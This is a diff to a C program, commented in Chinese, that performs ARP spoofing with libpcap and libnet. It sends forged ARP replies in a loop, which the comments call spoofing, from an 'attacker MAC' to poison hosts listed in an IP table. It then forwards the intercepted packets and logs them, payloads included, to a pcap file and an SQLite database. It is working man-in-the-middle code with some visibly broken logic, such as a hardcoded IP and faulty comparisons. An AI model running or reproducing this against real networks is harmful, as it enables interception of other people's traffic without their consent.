@@ -13,7 +13,7 @@
 #include<arpa/inet.h>
 #include<pthread.h>
 #define SIZE_ETHERNET 14
-#define PACKETS_NUMBERS 5000
+#define PACKETS_NUMBERS 5
 
 #define ARP_REQUEST 1
 #define ARP_REPLY   2
@@ -31,11 +31,13 @@ int get_mac(char* device,unsigned char src_mac[6]);
 void string_to_arry(unsigned char temp[4],char ip[17]);
 
 int send_packets();//用于数据包转发
-
+char* ip_hostt;
 struct ip_mac ip_form[MAX_IP_NUM];
 int ip_num;
 char* device;
 pcap_t* handle=NULL;
+unsigned char mac_host[6];
+u_int8_t* ip_host;
 int main()
 {
     pcap_if_t*  alldevsp=NULL;
@@ -45,8 +47,7 @@ int main()
     FILE* filter=fopen("filter","r");//过滤规则文件
     char filter_str[200];
     int ret=0;
-//将表格数据存入结构体数组供以后使用
-    while(!feof(fp_ip))
+    while(!feof(fp_ip))//将表格数据存入结构体数组以供使用 ip_num为ip地址数量
     {
 	    fgets(ip_form[ip_num].ip,17,fp_ip);
 	    if(ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]=='\n')
@@ -54,7 +55,7 @@ int main()
 	    ip_num++;
     }
     ip_num-=1;
-    device=pcap_lookupdev(errbuf);//device是设备名
+    device=pcap_lookupdev(errbuf);//device是设备名，全局变量以供调用
     if(device)
     {
 	    fprintf(fp,"name is %s\n",device);
@@ -65,7 +66,34 @@ int main()
 	    fprintf(fp,"open device failure\n");
 	    exit(1);
     }
+    //unsigned char mac_host[6];
+    if(get_mac(device,mac_host)==0)
+    {
+	     printf("host mac:%02x %02x %02x %02x %02x %02x\n",
+                    mac_host[0]&0xff,
+                    mac_host[1]&0xff,
+                    mac_host[2]&0xff,
+                    mac_host[3]&0xff,
+                    mac_host[4]&0xff,
+                    mac_host[5]&0xff);
 
+    }
+    else
+    {
+	    fprintf(fp,"获得本机MAC地址时错误\n");
+	    printf("get_mac函数调用获得本机地址时错误\n");
+    }
+    ip_host=(u_int8_t*) get_ip(device);
+    if(ip_host!=NULL)
+    {
+	    printf("host ip %s\n",ip_host);
+    }
+    else
+    {
+	    fprintf(fp,"获得主机IP地址时错误\n");
+	    printf("调用get_ip函数时出错，主机ip地址未获得\n");
+	    exit(1);
+    }
     handle=pcap_open_live(device,65535,1,0,errbuf);
     if(handle)
     {
@@ -74,18 +102,17 @@ int main()
     }
     else
     {
+	fprintf(fp,"调用pcap_open_live时出错\n");
         printf("open_live error%s\n",errbuf);
         exit(1);
     }
-
     pcap_dumper_t* dumpfp;
-    dumpfp=pcap_dump_open(handle,"dump.pcap");//用于保存日志文件
+    dumpfp=pcap_dump_open(handle,"dump.pcap");//用于保存日志文件,内容为原始数据包
     if(dumpfp==NULL)
     {
 	    fprintf(fp,"No dump.pcap\n");
 	    exit(1);
     }
-
     bpf_u_int32 netp,maskp;
     char* net,*mask;
     struct in_addr addr;
@@ -101,7 +128,6 @@ int main()
         fprintf(fp,"call pcap_lookupnet failure\n");
         exit(1);
     }
-
     addr.s_addr=netp;
     net=inet_ntoa(addr);
     if(net==NULL)
@@ -113,46 +139,23 @@ int main()
     {
 	    printf("ip %s\n",net);
     }
-
-    unsigned char mac_host[6];
-    if(get_mac(device,mac_host)==0)
-    {
-	     printf("host mac:%02x %02x %02x %02x %02x %02x\n",
-                    mac_host[0]&0xff,
-                    mac_host[1]&0xff,
-                    mac_host[2]&0xff,
-                    mac_host[3]&0xff,
-                    mac_host[4]&0xff,
-                    mac_host[5]&0xff);
-
-    }
-
-    u_int8_t*  ip_host=(u_int8_t*) get_ip(device);
-    if(ip_host!=NULL)
-    {
-	    printf("host ip %s\n",ip_host);
-    }
-
-
     addr.s_addr=maskp;
     mask=inet_ntoa(addr);
     if(mask==NULL)
     {
-	    printf("ip error\n");
+	    printf("mask error\n");
 	    exit(0);
     }
     else
     {
 	    printf("mask is%s\n",mask);
     }
-    
     if(fgets(filter_str,199,filter)==NULL)
     {
 	    fprintf(fp,"OPEN FILTER FAILURE\n");
 	    printf("OPEN FILTER FAILURE\n");
 	    exit(1);
     }
-
     struct bpf_program f;
     if(pcap_compile(handle,&f,filter_str,0,netp)==-1)
     {
@@ -160,9 +163,8 @@ int main()
 	    printf("COMPILE ERROR\n");
 	    exit(1);
     }
-
-    if(pcap_setfilter(handle,&f)==-1)
-    {
+    if(pcap_setfilter(handle,&f)==-1)//编译过滤规则，过滤规则写入filter配置文件
+    { 
 	    fprintf(fp,"SETFILTER ERROR\n");
 	    printf("SETFILTER ERROR\n");
 	    exit(1);
@@ -171,39 +173,35 @@ int main()
     {
 	    printf("Commpile success\n");
     }
-
-    for(int i=1;i<ip_num;i++)
+    for(int i=0;i<ip_num;i++)//向ip表中的所有ip发送ARP请求包，目的获得他们的mac地址
     {
 	    u_int8_t* dst_ip_str = (u_int8_t*) ip_form[i].ip;
 	    send_arp(dst_ip_str,device);
     }
-    pthread_t thread;
+    pthread_t thread;//线程用于循环发送ARP应答包以达到欺骗目的，已实现。
     if(pthread_create(&thread,NULL,send_arp_reply,NULL)==-1)
     {
 	    printf("creat thread failure\n");
+	    fprintf(fp,"建立发送线程时失败\n");
+	    exit(1);
     }
     else
     {
 	    printf("creat thread success\n");
     }
-
     ret=pcap_loop(handle,PACKETS_NUMBERS,analyze_packets,(u_char *)dumpfp);
     if(ret==0)
     {
-	    fprintf(fp,"pcap_loop success\n");
 	    printf("pcap_loop success\n");
-
     }
     else
     {
 	    fprintf(fp,"pcap_loop failure\n");
 	    printf("pcap_loop failure\n");
-
+	    exit(1);
     }
-
-    pthread_cancel(thread);
+    pthread_cancel(thread);//取消线程，在线程执行路径上有pthread_testcancel;
     pcap_dump_close(dumpfp);
-
     pcap_freealldevs(alldevsp);
     fclose(fp);
     fclose(filter);
@@ -214,45 +212,42 @@ int main()
 
 void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
 {
-   
-    const struct mac_header *ethernet=NULL;
-    const struct ip_header  *ip=NULL;
-    const struct tcp_header *tcp=NULL;
-    const struct arp_header *arp=NULL;
-    const unsigned char* payload=NULL;
+    struct mac_header *ethernet=NULL;
+    struct ip_header  *ip=NULL;
+    struct tcp_header *tcp=NULL;
+    struct arp_header *arp=NULL;
+    unsigned char* payload=NULL;
     sqlite3* db;
     char* sql;
     int ret;
     ret = sqlite3_open("packet.db",&db);
     if(ret)
     {
+	    printf("打开数据库出错\n");
 	    exit(1);
     }
-
-    printf("********************************************\n");
+    printf("*****************************************************************************************\n");
     pcap_dump(args,header,packet);
     ethernet = (struct mac_header*)(packet);
-    
     switch(ntohs(ethernet->mac_type)){
 	    case 0x0800:printf("IP PACKET\n");break;
 	    case 0x0806:printf("ARP PACKET\n");break;
 	    case 0x8035:printf("RARP PACKET\n");break;
-    }
-    if(ntohs(ethernet->mac_type)==0x0800)
+    }//暂时先显示这些数据包
+    if(ntohs(ethernet->mac_type)==0x0800)//IP数据包，应当能提供转发操作
     {
     	ip=(struct ip_header*)(packet+14);
     	static unsigned int tcp_num=0,icmp_num=0,udp_num=0;//个数据包捕获的数量 
-  //     unsigned int paclen = header->len;//解析出包长度
-  //	  unsigned pacaplen=header->caplen;//解析出包字节数
+  //    unsigned int paclen = header->len;//解析出包长度
+  //    unsigned pacaplen=header->caplen;//解析出包字节数
     	char* strtime=ctime((const time_t*)&header->ts.tv_sec);//捕获时间
     	static unsigned int count=0;
     	static double packet_count=0;//每秒数据包数量
     	static unsigned int packets_len=0;//总流量
-  //	  static unsigned int tick_count=0;//时间起点
-  //	  static double speed=0.0;//流量传输速度
+  //	static unsigned int tick_count=0;//时间起点
+  //	static double speed=0.0;//流量传输速度
     	packets_len+=header->len;
     	packet_count++;
-
     	switch(ip->ip_p){
     	        case IPPROTO_TCP:
     	    	    printf("TCP 协议\n");
@@ -262,15 +257,13 @@ void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char
     	    	    printf("UDP 协议\n");
     	    	    udp_num++;
     	    	    break;
-    	   	   case IPPROTO_ICMP:
+    	         case IPPROTO_ICMP:
     	    	    printf("ICMP 协议\n");
     	    	    icmp_num++;
-    	}
-    	
+    	}//此处应当将TCP UDP ICMP分离//此处先仅仅分离tcp
     	tcp=(struct tcp_header*)(packet+14+20);
-    	
     	printf("捕获时间    : %s\n",strtime); 
-    	printf("mac目的地址：%02x %02x %02x %02x %02x %02x\n",
+    	printf("目的mac地址：%02x %02x %02x %02x %02x %02x\n",
     	    	    ethernet->mac_dhost[0],
     	    	    ethernet->mac_dhost[1],
     	    	    ethernet->mac_dhost[2],
@@ -284,28 +277,33 @@ void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char
     	    	    ethernet->mac_shost[3],
     	    	    ethernet->mac_shost[4],
     	    	    ethernet->mac_shost[5]); 
-
     	printf("源IP地址   ：%s\n",inet_ntoa(ip->ip_src));
     	printf("目的IP地址 ：%s\n",inet_ntoa(ip->ip_dst));
-
-
     	printf("源端口     :%d\n",ntohs(tcp->th_sport));
     	printf("目的端口   :%d\n",ntohs(tcp->th_dport));
     	printf("Tcp数据包数量%d\tudp数据包数量%d\ticmp数据包数量%d\n",tcp_num,udp_num,icmp_num);
-
-        if(strcmp(inet_ntoa(ip->ip_dst),get_ip(device))!=0)	
-	for(int i=1;i<ip_num;i++)
+        if((strcmp(inet_ntoa(ip->ip_dst),"192.168.1.28")!=0)&&(ethernet->mac_dhost[0]!=0xdc))//尝试转发数据包	目的ip与目的mac不一致时发送
 	{
-		if(strcmp(ip_form[i].ip,inet_ntoa(ip->ip_dst))==0)
+		printf("目的IP地址与本机IP地址不相等\n");
+		for(int i=0;i<ip_num;i++)
 		{
-			strcpy((char*)ethernet->mac_dhost,(char*)ip_form[i].mac);
-	                if(pcap_inject(handle,packet,header->len)==PCAP_ERROR)
-	                {
-		        	printf("send packet error\n");
-                	}
-			break;
+			if(strcmp(ip_form[i].ip,inet_ntoa(ip->ip_dst))==0)
+			{
+				printf("ip_form表中IP地址%s",ip_form[i].ip);
+				for(int j=0;j<6;j++)
+				{
+					ethernet->mac_dhost[j]=ip_form[i].mac[j];
+					printf("ip_form");//****************************
+				}
+	                        if(pcap_inject(handle,packet,header->len)==PCAP_ERROR)
+		                {
+			        	printf("send packet error\n");
+	                	}
+				break;
+			}
 		}
 	}
+	printf("转发数据包结束\n");
   	unsigned int size_tcp=TH_OFF(tcp)*4;
   	payload=(u_char*)(packet+14+20+size_tcp);
   	const u_char *ch=payload;
@@ -411,7 +409,7 @@ void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char
 			arp->ip_dst[3]
 			);
 	printf("比较\n");
-	for(int i=1;i<ip_num;i++)
+	for(int i=0;i<ip_num;i++)
 	{
 		unsigned char temp[4];
 		string_to_arry(temp,ip_form[i].ip);
@@ -428,7 +426,6 @@ void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char
 	printf("比较失败\n");
     }
 }
-
 
 char* get_ip(char* device)
 {
@@ -447,7 +444,7 @@ char* get_ip(char* device)
       	         memcpy(&sin, &ifr.ifr_addr, sizeof(ifr.ifr_addr));
         	 return inet_ntoa(sin.sin_addr);
         }
-	return 0;
+	return NULL;
 }
 
 int get_mac(char* device,unsigned char src_mac[6])
@@ -478,28 +475,21 @@ int send_arp(u_int8_t* dst_ip_str,char* device)
 	u_int8_t rev_mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};
 	u_int32_t  dst_ip,src_ip;
         libnet_ptag_t arp_proto_tag, eth_proto_tag;
-        /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
         if ( (handle = libnet_init(LIBNET_LINK_ADV, device, errbuf)) == NULL ) 
         {
             printf("libnet_init: error [%s]\n", errbuf);
-            exit(-2);
+            return -1;
         }
 	unsigned char src_mac[6];
 	get_mac(device,src_mac);
-	printf("send_arp\n");
-	printf("\ndst_ip_str %s\nsrc_ip_str%s\n",dst_ip_str,src_ip_str);
-    
-        /* 把目的IP地址字符串转化成网络序 */
+	printf("调用send_arp函数，其中主机的IP地址为%s,主机的mac地址为%s,目的IP地址为%s\n",src_ip_str,src_mac,dst_ip_str);
         dst_ip = libnet_name2addr4(handle,(char*)dst_ip_str, LIBNET_RESOLVE);
-        /* 把源IP地址字符串转化成网络序 */
         src_ip = libnet_name2addr4(handle,(char*)src_ip_str, LIBNET_RESOLVE);
-    
         if ( dst_ip == -1 || src_ip == -1 )
 	{
             printf("send_arp ip address convert error\n");
-	    exit(-1);
+	    return -1;
 	}
-        /* 构造arp协议块 */
         arp_proto_tag = libnet_build_arp(
                     ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
                     ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
@@ -515,10 +505,9 @@ int send_arp(u_int8_t* dst_ip_str,char* device)
                     handle,              /* libnet tag */
                     0                    /* Create new one */
         );
-    
         if (arp_proto_tag == -1)    {
             printf("build IP failure\n");
-            exit(-3);
+            return -1;
         }
         eth_proto_tag = libnet_build_ethernet(
             (u_int8_t *)dst_mac,         /* 以太网目的地址 */
@@ -531,7 +520,7 @@ int send_arp(u_int8_t* dst_ip_str,char* device)
         );
         if (eth_proto_tag == -1) {
             printf("build eth_header failure\n");
-            return (-4);
+            return -1;
         }
         packet_size = libnet_write(handle);    /* 发送已经构造的数据包*/
         if(packet_size);
@@ -543,15 +532,19 @@ void*  send_arp_reply(void* a)
 {
 	while(1)
 	{
-		printf("sendreply%d\n",ip_num);
+		printf("调用sendreply函数\n");
 		sleep(1);
 		libnet_t* handle;
 		int packet_size;
-//		for(int src=0;src<ip_num;src++)
+		for(int src=0;src<ip_num;src++)//对IP表中的某一IP地址发送其他地址的arp欺骗包
 		{
-			for(int dst=1;dst<ip_num;dst++)
+			for(int dst=0;dst<ip_num;dst++)
 			{
-				if(ip_form[dst].mac==NULL)
+				if(ip_form[dst].mac==NULL&&(
+				   ip_form[src].ip[0]!=ip_form[dst].ip[0]&&
+		      		   ip_form[src].ip[1]!=ip_form[dst].ip[1]&&
+				   ip_form[src].ip[2]!=ip_form[dst].ip[2]&&
+				   ip_form[src].ip[3]!=ip_form[dst].ip[3]))//ip表中对应的IP的MAC地址不为空且不是本身
 					continue;
 				unsigned char src_mac[6];//攻击者MAC地址
 				get_mac(device,src_mac);
@@ -560,10 +553,11 @@ void*  send_arp_reply(void* a)
 				if((handle=libnet_init(LIBNET_LINK_ADV,device,errbuf))==NULL)
 				{
 					printf("libnet_init:errbuf %s\n",errbuf);
+					exit(-1);
 				}
 				src_ip=libnet_name2addr4(handle,ip_form[0].ip,LIBNET_RESOLVE);
 				dst_ip=libnet_name2addr4(handle,ip_form[dst].ip,LIBNET_RESOLVE);
-				printf("%s\n%s\n%02x %d %02x\n",ip_form[0].ip,ip_form[dst].ip,src_mac[0]&0xff,src_mac[1],src_mac[2]);
+				printf("显示的当前的IP地址%s\n本机MAC为：%s\n%02x %d %02x\n",ip_form[dst].ip,ip_form[dst].ip,src_mac[0]&0xff,src_mac[1],src_mac[2]);
 				if(dst_ip==-1||src_ip==-1)
 					printf("ip address convert error\n");
 				arp_proto_tag=libnet_build_arp(
@@ -583,6 +577,7 @@ void*  send_arp_reply(void* a)
 				if(arp_proto_tag==-1)
 				{
 					printf("build IP failure\n");
+					exit(-1);
 				}
 				eth_proto_tag=libnet_build_ethernet(
 						(u_int8_t*)ip_form[dst].mac,
@@ -596,6 +591,7 @@ void*  send_arp_reply(void* a)
 				if(eth_proto_tag==-1)
 				{
 					printf("build eth_header failure\n");
+					exit(-1);
 				}
 				packet_size=libnet_write(handle);
 			        if(packet_size);
@@ -606,7 +602,7 @@ void*  send_arp_reply(void* a)
 	}
 }
 
-void string_to_arry(unsigned char temp[4],char ip[17])
+void string_to_arry(unsigned char temp[4],char ip[17])//本函数目的将字符串的IP地址转化成用大小为4数组存储
 {
 	long int len=strlen(ip);
 	int j=1;
